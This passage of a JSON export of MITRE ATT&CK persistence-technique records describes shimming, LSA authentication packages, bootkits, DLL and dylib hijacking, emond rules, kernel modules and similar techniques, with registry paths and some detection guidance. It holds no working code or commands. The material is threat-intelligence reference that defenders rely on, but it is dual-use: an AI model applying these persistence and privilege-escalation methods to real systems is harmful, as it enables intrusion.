Shimming","sort_id":0,"external_id":"T1138","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>The Microsoft Windows Application Compatibility Infrastructure\/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Endgame Process Injection July 2017) Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses <a href=\"https:\/\/attack.mitre.org\/techniques\/T1179\">Hooking<\/a> to redirect the code as necessary in order to communicate with the OS. <\/p>\n<p>A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:<\/p>\n<ul>\n<li><code>%WINDIR%\\AppPatch\\sysmain.sdb<\/code><\/li>\n<li><code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb<\/code><\/li>\n<\/ul>\n<p>Custom databases are stored in:<\/p>\n<ul>\n<li><code>%WINDIR%\\AppPatch\\custom &amp; %WINDIR%\\AppPatch\\AppPatch64\\Custom<\/code><\/li>\n<li><code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom<\/code><\/li>\n<\/ul>\n<p>To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1088\">Bypass User Account Control<\/a> (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1179\">Hooking<\/a>, utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":162,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":165,"name":"T1131 - Authentication Package","sort_id":0,"external_id":"T1131","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. (Citation: MSDN Authentication Packages)<\/p>\n<p>Adversaries can use the autostart mechanism provided by LSA Authentication Packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\<\/code> with the key value of <code>&quot;Authentication Packages&quot;=<target binary><\/code>. The binary will then be executed by the system when the authentication packages are loaded.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":165,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":171,"name":"T1067 - Bootkit","sort_id":0,"external_id":"T1067","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)<\/p>\n<p>Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.<\/p>\n<h3>Master Boot Record<\/h3>\n<p>The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)<\/p>\n<h3>Volume Boot Record<\/h3>\n<p>The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":171,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":171,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":173,"name":"T1176 - Browser Extensions","sort_id":0,"external_id":"T1176","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse Internet browser extensions to establish persistence access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access. (Citation: Wikipedia Browser Extension) (Citation: Chrome Extensions Definition)<\/p>\n<p>Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. (Citation: Malicious Chrome Extension Numbers) Once the extension is installed, it can browse to websites in the background, (Citation: Chrome Extension Crypto Miner) (Citation: ICEBRG Chrome Extensions) steal all information that a user enters into a browser (including credentials) (Citation: Banker Google Chrome Extension Steals Creds) (Citation: Catch All Chrome Extension) and be used as an installer for a RAT for persistence.<\/p>\n<p>There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions. (Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command &amp; control  (Citation: Chrome Extension C2 Malware).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Inventory and monitor browser extension installations that deviate from normal, expected, and benign extensions. Process and network monitoring can be used to detect browsers communicating with a C2 server. However, this may prove to be a difficult way of initially detecting a malicious extension depending on the nature and volume of the traffic it generates.\n\nMonitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":173,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":173,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":173,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":177,"name":"T1042 - Change Default File Association","sort_id":0,"external_id":"T1042","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.<\/p>\n<p>System file associations are listed under <code>HKEY_CLASSES_ROOT.[extension]<\/code>, for example <code>HKEY_CLASSES_ROOT.txt<\/code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT[handler]<\/code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT[handler]\\shell[action]\\command<\/code>. For example:<\/p>\n<ul>\n<li><code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command<\/code><\/li>\n<li><code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command<\/code><\/li>\n<li><code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command<\/code><\/li>\n<\/ul>\n<p>The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":177,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":194,"name":"T1136 - Create Account","sort_id":0,"external_id":"T1136","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.<\/p>\n<p>Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for processes and command-line parameters associated with account creation, such as <code>net user<\/code> or <code>useradd<\/code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.\n\nCollect usage logs from cloud administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":194,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":194,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":194,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":194,"platform_id":4,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":194,"platform_id":5,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":194,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":194,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":194,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":202,"name":"T1038 - DLL Search Order Hijacking","sort_id":0,"external_id":"T1038","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. <\/p>\n<p>Adversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. <\/p>\n<p>Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order)<\/p>\n<p>If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.<\/p>\n<p>Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":202,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":226,"name":"T1157 - Dylib Hijacking","sort_id":0,"external_id":"T1157","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence.<\/p>\n<p>A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)<\/p>\n<p>If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level. This can be used by adversaries as a privilege escalation technique.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":226,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":230,"name":"T1519 - Emond","sort_id":0,"external_id":"T1519","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may use Event Monitor Daemon (emond) to establish persistence by scheduling malicious commands to run on predictable event triggers. Emond is a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1160\">Launch Daemon<\/a> that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>\/sbin\/emond<\/code> will load any rules from the <code>\/etc\/emond.d\/rules\/<\/code> directory and take action once an explicitly defined event takes place. The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>\/private\/var\/db\/emondClients<\/code>, specified in the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1160\">Launch Daemon<\/a> configuration file at<code>\/System\/Library\/LaunchDaemons\/com.apple.emond.plist<\/code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)<\/p>\n<p>Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1160\">Launch Daemon<\/a> service.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":230,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":245,"name":"T1133 - External Remote Services","sort_id":0,"external_id":"T1133","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may leverage external-facing remote services to initially access and\/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\/006\">Windows Remote Management<\/a> can also be used externally.<\/p>\n<p>Access to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Follow best practices for detecting adversary use of [Valid Accounts](https:\/\/attack.mitre.org\/techniques\/T1078) for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":245,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":245,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":250,"name":"T1044 - File System Permissions Weakness","sort_id":0,"external_id":"T1044","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.<\/p>\n<p>Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.<\/p>\n<h3>Services<\/h3>\n<p>Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and\/or privilege escalation to the account context the service is set to execute under (local\/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.<\/p>\n<h3>Executable Installers<\/h3>\n<p>Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%<\/code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1038\">DLL Search Order Hijacking<\/a>. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1088\">Bypass User Account Control<\/a>. Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":250,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":263,"name":"T1179 - Hooking","sort_id":0,"external_id":"T1179","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. <\/p>\n<p>Hooking involves redirecting calls to these functions and can be implemented via:<\/p>\n<ul>\n<li><strong>Hooks procedures<\/strong>, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) (Citation: Endgame Process Injection July 2017)<\/li>\n<li><strong>Import address table (IAT) hooking<\/strong>, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored. (Citation: Endgame Process Injection July 2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)<\/li>\n<li><strong>Inline hooking<\/strong>, which overwrites the first bytes in an API function to redirect code flow. (Citation: Endgame Process Injection July 2017) (Citation: HighTech Bridge Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)<\/li>\n<\/ul>\n<p>Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\">Process Injection<\/a>, adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.<\/p>\n<p>Malicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access. (Citation: Microsoft TrojanSpy:Win32\/Ursnif.gen!I Sept 2017)<\/p>\n<p>Hooking is commonly utilized by <a href=\"https:\/\/attack.mitre.org\/techniques\/T1014\">Rootkit<\/a>s to conceal files, processes, Registry keys, and other objects in order to hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":263,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":264,"name":"T1062 - Hypervisor","sort_id":0,"external_id":"T1062","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. (Citation: Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could be designed with <a href=\"https:\/\/attack.mitre.org\/techniques\/T1014\">Rootkit<\/a> functionality to hide its existence from the guest operating system. (Citation: Myers 2007) A malicious hypervisor of this nature could be used to persist on systems through interruption.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":264,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":266,"name":"T1525 - Implant Container Image","sort_id":0,"external_id":"T1525","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may implant cloud container images with malicious code to establish persistence. Amazon Web Service (AWS) Amazon Machine Images (AMI), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)<\/p>\n<p>A tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an attacker has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1505\/003\">Web Shell<\/a>.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019) Adversaries may also implant Docker images that may be inadvertently used in cloud deployments, which has been reported in some instances of cryptomining botnets.(Citation: ATT Cybersecurity Cryptocurrency Attacks on Cloud) <\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor interactions with images and containers by users to identify ones that are added or modified anomalously.","platforms":[{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":266,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":266,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":266,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":278,"name":"T1215 - Kernel Modules and Extensions","sort_id":0,"external_id":"T1215","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode <a href=\"https:\/\/attack.mitre.org\/techniques\/T1014\">Rootkit<\/a> that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)<\/p>\n<p>Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)<\/p>\n<p>Kernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload<\/code> and <code>kextunload<\/code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":278,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":278,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":280,"name":"T1161 - LC_LOAD_DYLIB Addition","sort_id":0,"external_id":"T1161","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies (Citation: Writing Bad Malware for OSX). There are tools available to perform these changes. Any changes will invalidate digital signatures on binaries because the binary is being modified. Adversaries can remediate this issue by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time (Citation: Malware Persistence on OS X).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 